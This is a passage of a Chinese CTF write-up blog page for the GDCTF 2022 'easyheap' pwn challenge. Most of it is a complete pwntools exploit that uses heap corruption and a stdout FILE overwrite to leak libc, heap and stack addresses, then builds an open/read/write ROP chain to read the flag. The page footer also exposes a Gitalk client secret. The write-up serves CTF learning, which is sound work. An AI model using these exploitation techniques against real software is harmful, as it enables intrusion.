class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">getIO = <span class="keyword">lambda</span>:process([<span class="string">&#x27;./ld-2.31.so&#x27;</span>, <span class="string">&#x27;./easyheap&#x27;</span>], env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">io = getIO()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, cont</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">size, offset, cont</span>):</span><br><span class="line">    pp = <span class="string">&#x27;1\x00&#x27;</span></span><br><span class="line">    pp += <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">12</span> - <span class="built_in">len</span>(pp))</span><br><span class="line">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;4.delete\n&#x27;</span>, pp)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add3</span>(<span class="params">size, offset, cont</span>):</span><br><span class="line">    pp = <span class="string">&#x27;1\x00&#x27;</span></span><br><span class="line">    pp += <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">12</span> - <span class="built_in">len</span>(pp))</span><br><span class="line">    pp += p32(ctypes.c_uint32(offset).value)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;4.delete&#x27;</span>, pp)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Idx?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">size, offset, cont</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete\n&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Offset?\n&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:\n&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor2</span>(<span class="params">size, offset, cont</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;4.delete&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Offset?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Context:&#x27;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    fake_size = <span class="number">0x061</span> + <span class="number">0x1000</span>*<span class="number">1</span></span><br><span class="line">    <span class="comment"># add(,&#x27;aaaaa&#x27;)</span></span><br><span class="line">    backdoor(<span class="number">0x18</span>, <span class="number">0x6b8</span>, p64(fake_size))</span><br><span class="line">    add(<span class="number">0x2000</span>, <span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add2(<span class="number">0x10</span>, -<span class="number">10</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    backdoor(<span class="number">0x18</span>, -<span class="number">3080</span>, <span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line">    <span class="comment"># backdoor(0x18, -32, &#x27;\xb0&#x27;)</span></span><br><span class="line">    backdoor(<span class="number">0x18</span>, -<span class="number">3616</span>+<span class="number">6</span>, p32(<span class="number">0x7</span>))</span><br><span class="line">    stdout_in = <span class="number">0x16a0</span></span><br><span class="line"></span><br><span class="line">    backdoor(<span class="number">0x18</span>, <span class="number">800</span>, <span class="string">&#x27;\xa0\x16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add2(0x18, 0, &#x27;aa&#x27;)</span></span><br><span class="line">    flag = <span class="number">0xfbad1800</span></span><br><span class="line">    <span class="comment"># add2(0x18, )</span></span><br><span class="line">    add2(<span class="number">0x48</span>, <span class="number">1</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add2(<span class="number">0x48</span>, <span class="number">0</span>, p64(flag)+p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x08&#x27;</span>)</span><br><span class="line">        inp = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.add&#x27;</span> <span class="keyword">in</span> inp:</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">1</span> == <span class="number">2</span></span><br><span class="line">        stdin_addr = u64(inp)</span><br><span class="line">        log.success(<span class="string">&#x27;stdin_addr:&#x27;</span>+<span class="built_in">hex</span>(stdin_addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        io = getIO()</span><br><span class="line"></span><br><span class="line">libc_base = stdin_addr - <span class="number">0x1ee7f0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena_96 = <span class="number">0x1ecbe0</span> + libc_base</span><br><span class="line">edit2(<span class="number">0</span>, p64(flag)+p64(<span class="number">0</span>)*<span class="number">3</span> + p64(main_arena_96))</span><br><span class="line"></span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) -<span class="number">0x23010</span>  </span><br><span class="line">log.success(<span class="string">&#x27;heap_base:&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">environ = <span class="number">0x228138</span> + libc_base <span class="comment"># 偏移量可能不同</span></span><br><span class="line">edit2(<span class="number">0</span>, p64(flag)+p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ+<span class="number">0x10</span>) + p64(environ+<span class="number">0x10</span>))</span><br><span class="line">log.success(<span class="string">&#x27;environ:&#x27;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">stack_environ = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack_environ:&#x27;</span>+<span class="built_in">hex</span>(stack_environ))</span><br><span class="line"></span><br><span class="line">rax_0 = <span class="number">0x00000000000b1d89</span> + libc_base <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">rax_1 = <span class="number">0x00000000000cfb50</span> + libc_base <span class="comment">#  mov rax, 1 ; ret</span></span><br><span class="line">rax_2 = <span class="number">0x00000000000cfb60</span> + libc_base <span class="comment">#  mov rax, 2 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b72</span> + libc_base <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002604f</span> + libc_base <span class="comment"># pop rsi ; ret</span></span><br><span class="line">xchg_eax_edi = <span class="number">0x00000000000f1b95</span> + libc_base <span class="comment"># xchg eax, edi ; ret</span></span><br><span class="line">syscall = <span class="number">0x00000630D9</span> + libc_base <span class="comment"># syscall; ret in (funlockfile) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln_stack_tar = stack_environ - <span class="number">0x138</span> + <span class="number">0x20</span></span><br><span class="line">backdoor2(<span class="number">0x18</span>, -<span class="number">512</span>, p64(vuln_stack_tar))</span><br><span class="line"></span><br><span class="line">add3(<span class="number">0xf0</span>-<span class="number">8</span>, <span class="number">1</span>, <span class="string">&#x27;aaaaaa&#x27;</span>)</span><br><span class="line"><span class="comment"># io.sendafter(&#x27;4.delete&#x27;, &#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;Size?&#x27;, )</span></span><br><span class="line"></span><br><span class="line">rop_tmp = [</span><br><span class="line">    pop_rdi, <span class="number">0xadd</span>,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    rax_2, syscall, <span class="comment"># open</span></span><br><span class="line">    xchg_eax_edi, <span class="comment"># eax -&gt; edi fd</span></span><br><span class="line">    pop_rsi, <span class="number">0xadd</span>,</span><br><span class="line">    rax_0, syscall, <span class="comment"># read</span></span><br><span class="line">    pop_rdi, <span class="number">1</span>, </span><br><span class="line">    rax_1, syscall <span class="comment"># write</span></span><br><span class="line">]</span><br><span class="line">rop_tmp[<span class="number">1</span>] = rop_tmp[<span class="number">8</span>] = vuln_stack_tar + <span class="built_in">len</span>(rop_tmp) * <span class="number">8</span></span><br><span class="line">rop_tmp = flat(rop_tmp) + <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">add3(<span class="number">0xf0</span>-<span class="number">8</span>, <span class="number">1</span>, rop_tmp)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>赛后的补题，比赛没时间了（菜），本地记得新建.&#x2F;flag文件</p>
<p><img src="/p/2022gdCTF-pwn/image-20220524095329685.png" alt="image-20220524095329685"></p>
</p></div><div class="post-footer"><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>作者: Csome</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-05-23</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a><i class="fa fa-tag"></i><a class="tag" href="/tags/Pwn/" title="Pwn">Pwn </a><i class="fa fa-tag"></i><a class="tag" href="/tags/GDCTF/" title="GDCTF">GDCTF </a><span>大约1945个字, 6分钟29秒读完</span></div></div></div></div><div class="share"><div class="share-btn linkonly"><a class="fa fa-link" onclick="Utils.copyToClipboard(window.location.href)" ref="sidebar"></a></div><div class="share-btn evernote"><a class="fa fa-share" onclick="Anatolo.share.native()" ref="sidebar"></a></div><div class="share-btn weibo"><a class="fab fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="share-btn twitter"><a class="fab fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=%E5%88%86%E4%BA%AB%E6%96%87%E7%AB%A0%EF%BC%9A%0A%0ACsome%20%C2%B7%20%5B2022gdCTF%5Djmp_rsp%20midpwn%20easyheap%20WP%0Ahttps://blog.csome.cc//p/2022gdCTF-pwn/%0A"></a></div><div class="share-btn mastodon"><a class="fab fa-mastodon" target="_blank" rel="noopener" href="https://mastodonshare.com/?text=%E5%88%86%E4%BA%AB%E6%96%87%E7%AB%A0%EF%BC%9A%0A%0ACsome%20%C2%B7%20%5B2022gdCTF%5Djmp_rsp%20midpwn%20easyheap%20WP%0Ahttps://blog.csome.cc//p/2022gdCTF-pwn/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/p/2022CISCN-hn-wp/" title="[2022CISCN]华南赛区分区赛 部分Pwn wp">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/p/2022cqb-pwn-chunzhiIot/" title="[2022春秋杯] Pwn chunzhiIot wp">下一篇</a></li></ul></div><script>Anatolo.comment.setConfig({"valine":{"enable":false,"appid":null,"appkey":null,"notify":false,"verify":false,"avatar":"mm","placeholder":"hello, world"},"gitment":{"enable":false,"owner":"Your GitHub ID","repo":"Repo to store comments","client_id":"Your client ID","client_secret":"Your client secret"},"gitalk":{"enable":true,"owner":"csomepro","repo":"blogComment","client_id":"7d6a77c3aaf8c1731f93","client_secret":"bdcc0b620d6bc922d81a3f92d3ecf0ecb1c8feee"},"duoshuo":null,"disqus":null,"gentie":null})</script><a id="comments"></a><div id="gitalk_container" style="padding: 10px"></div></div></div></div></div></main-outlet><script>(async function(){ if (Anatolo.search == null) await Anatolo.getMsg("search-init"); Anatolo.search.config = {translation:{posts:"文章",pages:"页面",categories:"分类",tags:"标签",untitled:"(无标题)",} }; })()</script><div class="searchbox ins-search modal-cover"><div class="searchbox-container ins-search-container modal-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="想要查找什么..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="Anatolo.search.closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><button class="float-button hide" id="scroll-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})" type="button" title="回到顶部"><i class="fa fa-angle-up"></i></button><div class="modal-cover" id="success-indicator"><div class="modal-container indicator"><i class="fa fa-check"></i></div></div></body></html>